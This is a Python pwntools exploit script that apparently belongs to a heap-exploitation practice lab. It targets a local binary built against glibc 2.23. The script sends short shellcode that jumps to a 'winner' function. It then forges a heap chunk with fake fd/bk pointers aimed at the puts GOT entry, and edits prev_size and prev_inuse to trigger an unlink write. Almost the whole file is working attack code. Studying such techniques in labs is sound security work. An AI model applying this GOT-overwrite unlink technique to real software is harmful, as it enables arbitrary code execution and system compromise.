#!/usr/bin/env python3

from pwn import * 
import os

mode = 'DEBUGoff' # Turn on/off gdb
libc_name = '../../../libc_versions/2.23_unlink/libc-2.23_unlink.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = '.unlink-2.23_unlink'

elf = ELF(elf_name)
if libc_name != '':
	libc = ELF(libc_name)
	ld = ELF("../../../libc_versions/2.23_unlink/ld-2.23_unlink.so")
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([ld.path, elf.path],env=env, aslr=False)
	gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23_unlink/
''') 

else: 
	p = process([ld.path, elf.path], env=env, aslr=False)


def shellcode():
	#shellcode = "\x90" * 8
	#shellcode += "\xcc"
	print("Creating shellcode!:\npush 0x401236;\nret;\n")
	my_shellcode = "\x68\x36\x12\x40\x00\xC3"
	return my_shellcode

def unlink(puts_GOT):
	print("Creating fake fd and bk pointers")
	print("Point to GOT entry and heap (shellcode)") 

	# Set to address of function pointer (GOT for puts) 
	fake_chunk = p64(puts_GOT-0x18)

	# Address of the shellcode
	fake_chunk += p64(0x155555424030)

	# The - 0x10 is beacuse of the writes done previously above
	fake_chunk += b"A" * (0x80 - 0x10) # Filler prior to chunk 'free_victim'


	print("Set prev_size of chunk to go back to our fake chunk") 
	print("Set prev_inuse bit of the chunk to '0' or free to force consolidation")

	fake_chunk += p64(0x90)
	fake_chunk += p64(0x90)
	print("Unleash the unlinking!") 
	return fake_chunk



winner_func = elf.symbols['winner']
puts_GOT = elf.got['puts']


p.sendline(shellcode())
p.sendline(unlink(puts_GOT)) # Corrupt chunk to perform unlinking later
p.interactive()
